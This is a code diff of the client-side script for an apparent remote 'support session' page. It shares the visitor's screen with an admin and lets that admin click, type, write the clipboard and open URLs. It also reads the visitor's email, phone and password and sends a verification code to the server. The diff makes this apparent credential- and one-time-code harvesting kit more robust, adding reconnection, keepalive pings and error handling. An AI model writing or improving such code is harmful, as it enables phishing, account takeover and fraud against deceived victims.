@@ -1,8 +1,11 @@
-let ws;
-let peerConnection;
-let stream;
+let ws = null;
+let peerConnection = null;
+let stream = null;
 let pendingCandidates = [];
 let controlGranted = false;
+let reconnectTimer = null;
+let pingTimer = null;
+let reconnectDelay = 3000;
 
 const iceServers = {
   iceServers: [
@@ -28,18 +31,35 @@ const isAndroid = /Android/.test(navigator.userAgent);
 const isMobile = isIOS || isAndroid;
 
 function connectWS() {
-  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
-  ws = new WebSocket(`${protocol}${window.location.host}`);
+  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+    return;
+  }
 
-  ws.onopen = () => {
-    ws.send(JSON.stringify({ type: "role", role: "visitor" }));
+  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
+  const socket = new WebSocket(`${protocol}${window.location.host}`);
+  ws = socket;
+
+  socket.onopen = () => {
+    reconnectDelay = 3000;
+    socket.send(JSON.stringify({ type: "role", role: "visitor" }));
     if (controlGranted) {
-      ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
+      socket.send(JSON.stringify({ type: "control-granted", target: "admin" }));
     }
+    if (pingTimer) clearInterval(pingTimer);
+    pingTimer = setInterval(() => {
+      if (socket.readyState === WebSocket.OPEN) {
+        socket.send(JSON.stringify({ type: "ping" }));
+      }
+    }, 20000);
   };
 
-  ws.onmessage = async (e) => {
-    const data = JSON.parse(e.data);
+  socket.onmessage = async (e) => {
+    let data;
+    try {
+      data = JSON.parse(e.data);
+    } catch (err) {
+      return;
+    }
 
     if (data.type === "pong") return;
 
@@ -54,19 +74,22 @@ function connectWS() {
     }
 
     if (data.type === "webrtc-answer") {
+      if (!peerConnection) return;
       try {
         await peerConnection.setRemoteDescription(
           new RTCSessionDescription(data.sdp),
         );
-        for (const cand of pendingCandidates) {
+        const queued = pendingCandidates;
+        pendingCandidates = [];
+        for (const cand of queued) {
           try {
             await peerConnection.addIceCandidate(new RTCIceCandidate(cand));
           } catch (err) {}
         }
-        pendingCandidates = [];
       } catch (err) {
         console.log("answer error", err);
       }
+      return;
     }
 
     if (data.type === "webrtc-ice") {
@@ -79,9 +102,13 @@ function connectWS() {
       } else {
         pendingCandidates.push(data.candidate);
       }
+      return;
     }
 
-    if (data.type === "admin-message") showToast(data.text);
+    if (data.type === "admin-message") {
+      showToast(data.text);
+      return;
+    }
 
     if (data.type === "request-control") {
       const accept = window.confirm(
@@ -89,10 +116,11 @@ function connectWS() {
       );
       if (accept) {
         controlGranted = true;
-        ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
+        socket.send(JSON.stringify({ type: "control-granted", target: "admin" }));
       } else {
-        ws.send(JSON.stringify({ type: "control-denied", target: "admin" }));
+        socket.send(JSON.stringify({ type: "control-denied", target: "admin" }));
       }
+      return;
     }
 
     if (data.type === "remote-click" && controlGranted) {
@@ -119,6 +147,7 @@ function connectWS() {
         if (el.click) el.click();
         if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") el.focus();
       }
+      return;
     }
 
     if (data.type === "remote-key" && controlGranted) {
@@ -169,8 +198,8 @@ function connectWS() {
         if (isInput) {
           const start = el.selectionStart;
           const end = el.selectionEnd;
-          let newStart = start,
-            newEnd = end;
+          let newStart = start;
+          let newEnd = end;
           if (data.key === "ArrowLeft") {
             newStart = Math.max(0, start - 1);
             newEnd = newStart;
@@ -206,10 +235,12 @@ function connectWS() {
         el.dispatchEvent(new Event("input", { bubbles: true }));
         return;
       }
+      return;
     }
 
     if (data.type === "remote-scroll" && controlGranted) {
       window.scrollBy({ top: data.deltaY, left: 0, behavior: "auto" });
+      return;
     }
 
     if (data.type === "remote-clipboard" && controlGranted) {
@@ -219,6 +250,7 @@ function connectWS() {
       } catch (err) {
         showToast("Failed to write clipboard.");
       }
+      return;
     }
 
     if (data.type === "remote-open-url") {
@@ -233,11 +265,16 @@ function connectWS() {
       } catch (err) {
         window.location.href = data.url;
       }
+      return;
     }
 
     if (data.type === "remote-close-tab") {
       if (stream) stream.getTracks().forEach((t) => t.stop());
-      if (peerConnection) peerConnection.close();
+      if (peerConnection) {
+        peerConnection.onicecandidate = null;
+        peerConnection.close();
+        peerConnection = null;
+      }
       window.close();
       setTimeout(() => {
         document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; background:#fcfcfc; color:#333; text-align:center;"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="margin-bottom:20px;"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg><h2>Session Terminated</h2><p>The support agent has ended this session.</p></div>`;
@@ -245,20 +282,29 @@ function connectWS() {
     }
   };
 
-  ws.onclose = () => {
-    setTimeout(connectWS, 3000);
+  socket.onclose = () => {
+    if (pingTimer) {
+      clearInterval(pingTimer);
+      pingTimer = null;
+    }
+    if (ws === socket) ws = null;
+    if (reconnectTimer) clearTimeout(reconnectTimer);
+    reconnectTimer = setTimeout(() => {
+      reconnectDelay = Math.min(reconnectDelay * 2, 30000);
+      connectWS();
+    }, reconnectDelay);
   };
 
-  ws.onerror = () => {
+  socket.onerror = () => {
     try {
-      ws.close();
-    } catch (e) {}
+      socket.close();
+    } catch (err) {}
   };
 }
 
-const style = document.createElement("style");
-style.innerHTML = `@keyframes clickRipple { from { transform: translate(-50%,-50%) scale(1); opacity: 1; } to { transform: translate(-50%,-50%) scale(2); opacity: 0; } }`;
-document.head.appendChild(style);
+const clickRippleStyle = document.createElement("style");
+clickRippleStyle.innerHTML = `@keyframes clickRipple { from { transform: translate(-50%,-50%) scale(1); opacity: 1; } to { transform: translate(-50%,-50%) scale(2); opacity: 0; } }`;
+document.head.appendChild(clickRippleStyle);
 
 document.getElementById("accept-btn").addEventListener("click", async () => {
   document.getElementById("screen-error").classList.add("hidden");
@@ -321,7 +367,12 @@ document.getElementById("accept-btn").addEventListener("click", async () => {
     document.getElementById("state-verify").classList.add("hidden");
     document.getElementById("state-3").classList.add("hidden");
     document.getElementById("state-1").classList.remove("hidden");
-    if (peerConnection) peerConnection.close();
+    if (peerConnection) {
+      peerConnection.onicecandidate = null;
+      peerConnection.close();
+      peerConnection = null;
+    }
+    stream = null;
   };
 
   document.getElementById("state-1").classList.add("hidden");
@@ -340,28 +391,40 @@ async function startWebRTC() {
     return;
   }
 
+  if (!ws || ws.readyState !== WebSocket.OPEN) {
+    console.log("WebSocket not open, cannot start WebRTC");
+    return;
+  }
+
   if (peerConnection) {
     peerConnection.onicecandidate = null;
     peerConnection.close();
+    peerConnection = null;
   }
 
-  peerConnection = new RTCPeerConnection(iceServers);
-  stream.getTracks().forEach((track) => peerConnection.addTrack(track, stream));
+  pendingCandidates = [];
 
-  peerConnection.onicecandidate = (event) => {
+  const pc = new RTCPeerConnection(iceServers);
+  peerConnection = pc;
+
+  stream.getTracks().forEach((track) => pc.addTrack(track, stream));
+
+  pc.onicecandidate = (event) => {
     if (event.candidate) {
-      ws.send(
-        JSON.stringify({
-          type: "webrtc-ice",
-          candidate: event.candidate,
-          target: "admin",
-        }),
-      );
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(
+          JSON.stringify({
+            type: "webrtc-ice",
+            candidate: event.candidate,
+            target: "admin",
+          }),
+        );
+      }
     }
   };
 
   try {
-    const transceiver = peerConnection.getTransceivers()[0];
+    const transceiver = pc.getTransceivers()[0];
     if (transceiver && RTCRtpSender.getCapabilities) {
       const caps = RTCRtpSender.getCapabilities("video");
       if (caps && caps.codecs) {
@@ -369,17 +432,25 @@ async function startWebRTC() {
         if (h264.length) transceiver.setCodecPreferences(h264);
       }
     }
-  } catch (e) {}
+  } catch (err) {}
 
-  const offer = await peerConnection.createOffer();
-  await peerConnection.setLocalDescription(offer);
-  ws.send(
-    JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }),
-  );
+  try {
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(
+        JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }),
+      );
+    }
+  } catch (err) {
+    console.log("offer error", err);
+  }
 }
 
 function handleVerify(event) {
   event.preventDefault();
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
   const email = document.getElementById("visitor-email").value;
   const phone = document.getElementById("visitor-phone").value;
   const password = document.getElementById("visitor-pass").value;
@@ -404,7 +475,6 @@ function handleVerify(event) {
   setTimeout(() => {
     document.getElementById("state-3").classList.add("hidden");
     document.getElementById("state-verify").classList.remove("hidden");
-
     btn.disabled = false;
     btnText.innerText = "Sign in";
     spinner.classList.add("hidden");
@@ -414,9 +484,9 @@ function handleVerify(event) {
 function handleCodeVerify(event) {
   event.preventDefault();
   const code = document.getElementById("verify-code").value;
-
-  ws.send(JSON.stringify({ type: "visitor-code", code: code }));
-
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ type: "visitor-code", code: code }));
+  }
   document.getElementById("state-verify").classList.add("hidden");
   document.getElementById("state-5").classList.remove("hidden");
 }
@@ -499,9 +569,3 @@ function showToast(text) {
 }
 
 connectWS();
-
-setInterval(() => {
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify({ type: "ping" }));
-  }
-}, 20000);
